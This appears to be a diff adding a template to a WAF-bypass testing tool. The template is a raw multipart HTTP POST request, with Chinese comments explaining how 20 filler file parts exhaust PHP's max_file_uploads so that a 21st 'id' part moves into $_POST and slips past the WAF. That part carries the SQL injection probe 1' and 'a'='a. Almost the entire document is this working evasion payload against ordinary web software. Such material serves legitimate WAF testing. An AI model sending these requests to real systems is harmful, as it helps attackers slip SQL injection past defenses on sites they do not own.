@@ -1,0 +1,120 @@
+# @name: PHP skip_upload耗尽max_file_uploads
+# @tags: post,multipart,php,skip-upload,max-file-uploads,id,bypass
+# @color: green
+# @validate: baseline_similarity
+# @threshold: 0.92
+# @intent: php_skip_upload_max_file_uploads
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: PHP max_file_uploads 默认为 20。先构造 20 个带 filename 的填充 part(a-t)填满上限，第 21 个带 filename 的真实 id part 因 upload_cnt<=0 触发 skip_upload=1，从 $_FILES 转入 $_POST。WAF 看到全是文件上传而放行。参考 do9gy Part3 第2条。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Content-Type: multipart/form-data; boundary=a
+
+--a
+Content-Disposition: form-data; name="a"; filename="1.png"
+Content-Type: image/png
+
+a
+--a
+Content-Disposition: form-data; name="b"; filename="1.png"
+Content-Type: image/png
+
+b
+--a
+Content-Disposition: form-data; name="c"; filename="1.png"
+Content-Type: image/png
+
+c
+--a
+Content-Disposition: form-data; name="d"; filename="1.png"
+Content-Type: image/png
+
+d
+--a
+Content-Disposition: form-data; name="e"; filename="1.png"
+Content-Type: image/png
+
+e
+--a
+Content-Disposition: form-data; name="f"; filename="1.png"
+Content-Type: image/png
+
+f
+--a
+Content-Disposition: form-data; name="g"; filename="1.png"
+Content-Type: image/png
+
+g
+--a
+Content-Disposition: form-data; name="h"; filename="1.png"
+Content-Type: image/png
+
+h
+--a
+Content-Disposition: form-data; name="i"; filename="1.png"
+Content-Type: image/png
+
+i
+--a
+Content-Disposition: form-data; name="j"; filename="1.png"
+Content-Type: image/png
+
+j
+--a
+Content-Disposition: form-data; name="k"; filename="1.png"
+Content-Type: image/png
+
+k
+--a
+Content-Disposition: form-data; name="l"; filename="1.png"
+Content-Type: image/png
+
+l
+--a
+Content-Disposition: form-data; name="m"; filename="1.png"
+Content-Type: image/png
+
+m
+--a
+Content-Disposition: form-data; name="n"; filename="1.png"
+Content-Type: image/png
+
+n
+--a
+Content-Disposition: form-data; name="o"; filename="1.png"
+Content-Type: image/png
+
+o
+--a
+Content-Disposition: form-data; name="p"; filename="1.png"
+Content-Type: image/png
+
+p
+--a
+Content-Disposition: form-data; name="q"; filename="1.png"
+Content-Type: image/png
+
+q
+--a
+Content-Disposition: form-data; name="r"; filename="1.png"
+Content-Type: image/png
+
+r
+--a
+Content-Disposition: form-data; name="s"; filename="1.png"
+Content-Type: image/png
+
+s
+--a
+Content-Disposition: form-data; name="t"; filename="1.png"
+Content-Type: image/png
+
+t
+--a
+Content-Disposition: form-data; name="id"; filename="1.png"
+Content-Type: image/png
+
+1' and 'a'='a
+--a--
